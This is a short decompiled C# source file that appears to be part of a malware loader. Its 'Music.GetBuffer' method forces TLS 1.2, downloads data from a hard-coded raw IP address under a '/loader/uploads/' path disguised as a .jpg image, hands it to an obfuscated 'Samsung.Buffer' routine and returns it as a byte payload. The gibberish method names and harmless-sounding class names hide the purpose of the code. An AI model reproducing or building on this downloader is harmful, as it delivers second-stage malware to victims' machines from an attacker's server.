using System;
using System.IO;
using System.Net;
using System.Text;

namespace WindowsFormsApp52;

internal class Music
{
	internal static byte[] GetBuffer()
	{
		object obj = Samsung.Buffer(Ajezwzaulhvdjlkxu("http://45.155.165.63/iyi/loader/uploads/065757081_Youbxumr.jpg"));
		if (obj == null)
		{
			obj = null;
		}
		else if (obj != null)
		{
			return (byte[])obj;
		}
		throw new Exception();
	}

	private static string Ajezwzaulhvdjlkxu(string s)
	{
		try
		{
			ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
		}
		catch
		{
		}
		using StreamReader streamReader = new StreamReader(WebRequest.Create(s).GetResponse().GetResponseStream(), Encoding.UTF8);
		return streamReader.ReadToEnd();
	}
}
